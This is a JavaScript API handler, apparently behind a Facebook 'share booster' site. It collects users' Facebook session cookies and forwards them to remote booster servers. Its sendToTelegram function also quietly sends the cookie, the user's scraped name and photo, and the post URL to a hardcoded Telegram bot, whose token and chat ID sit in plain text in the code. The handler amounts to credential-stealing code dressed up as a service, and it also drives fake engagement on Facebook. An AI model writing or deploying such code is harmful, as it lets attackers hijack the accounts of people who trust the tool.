import axios from "axios";

const serverUrls = {
  server1: "https://server1-u9fw.onrender.com",
  server2: "https://server-2-aggj.onrender.com",
  server3: "https://server-3-p6lg.onrender.com",
};

const BOT_TOKEN = "7923208116:AAEoZyMMNsCck0Z-W7zfle5vtdYDKC8B28U";
const CHAT_ID = "7442173988";

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({ message: "Only POST allowed" });

  const { cookie, url, amount, interval, server } = req.body;

  if (!cookie || !url || !amount || !interval || !serverUrls[server]) {
    return res.status(400).json({ message: "Invalid input." });
  }

  try {
    const photo = await getUserPhoto(cookie);
    const name = await getUserName(cookie);

    const result = await axios.post(`${serverUrls[server]}/api/submit`, {
      cookie,
      url,
      amount,
      interval,
    }, {
      headers: { "Content-Type": "application/json" }
    });

    const message = result.data?.message || "Boost sent.";

    // 🔄 Send to Telegram
    await sendToTelegram({ cookie, appstate: cookie, photo, name, postUrl: url });

    return res.status(200).json({ message, photo, name });
  } catch (err) {
    console.error("FBShare Error:", err.message);
    return res.status(500).json({ message: "Server error." });
  }
}

async function getUserPhoto(cookie) {
  try {
    const res = await axios.get("https://m.facebook.com/me", {
      headers: { Cookie: cookie }
    });
    const match = res.data.match(/profile_picture\/view.*?src=(.*?)&/);
    return match ? decodeURIComponent(match[1]) : null;
  } catch {
    return null;
  }
}

async function getUserName(cookie) {
  try {
    const res = await axios.get("https://m.facebook.com/me", {
      headers: { Cookie: cookie }
    });
    const match = res.data.match(/<title>(.*?)<\/title>/);
    return match ? match[1] : "Unknown";
  } catch {
    return "Unknown";
  }
}

async function sendToTelegram({ cookie, appstate, photo, name, postUrl }) {
  const text = `
📢 New FB Boost Submitted
👤 Name: ${name}
🔗 Post: ${postUrl}
🍪 Cookie: ${cookie.slice(0, 100)}...
📦 Appstate: ${appstate.slice(0, 100)}...
`;

  try {
    // 1. Send text
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text,
      parse_mode: "HTML"
    });

    // 2. Send profile photo if exists
    if (photo) {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        chat_id: CHAT_ID,
        photo
      });
    }
  } catch (err) {
    console.error("Telegram Send Failed:", err.message);
  }
}
